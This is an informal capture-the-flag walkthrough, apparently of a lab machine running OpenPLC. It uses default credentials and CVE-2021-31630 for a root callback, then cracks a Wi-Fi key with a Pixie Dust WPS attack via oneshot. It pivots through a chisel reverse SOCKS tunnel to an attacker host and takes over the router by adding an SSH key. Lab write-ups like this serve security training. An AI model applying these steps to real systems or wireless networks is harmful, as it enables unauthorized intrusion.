Started with a nmap scan
```
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
8080/tcp open  http-proxy syn-ack ttl 63 HAProxy http proxy
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.11.7:8080/login
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Going to the website its a OpenPLC testing default creds and we can now login `openplc:openplc` and now there is a exploit we can use `cve-2021-31630` there is a poc on github and now we have a call back as the root user doing some enumeration there is a `wlan0` interface which is not normal and there is `iwlist` also on the host so we can run `iwlist wlan0 scan` and found a access point were connected to with the ESSID of `plcrouter` and we can now perform a `pixe dust` attack we can us a tool called `oneshot` and I used to the C version of it and complied it on the host and now we can do `./oneshot -i wlan0 -b 01:00:00:00:01:00` and we get a password back `NoWWEDoKnowWhaTisReal123!` now we need to connect to the router first we need to make a conf file with all the right settings 
```
network={
ssid="plcrouter"
psk="NoWWEDoKnowWhaTisReal123!"
}
```
and now we do `wpa_supplicant -B -i wlan0 -c wpa.conf` and then `iwconfig wlan0` and it should show we are connected to the router now and we can run `arp` now and get the ip of the router and then we need to run `dhclient` to get a ipv4 address and then `arp -a` to get the router ip `192.168.1.1` and we can run a nmap scan on the router and we have some ports open
```
22 SSH 
53 DNS
80 Http
443 Https
```
so now we need to get chisel onto the host so we can port forward port `80` and then run these commands `./chisel server server -p 8000 --reverse` and then on the server `./chisel client 10.10.16.4:8000 R:socks` and now we cant proxy are traffic to are web browser and we can access the website now and there is no password set for the root account and then if we go to the admin area we can add are own ssh key and then proxychains ssh into the router 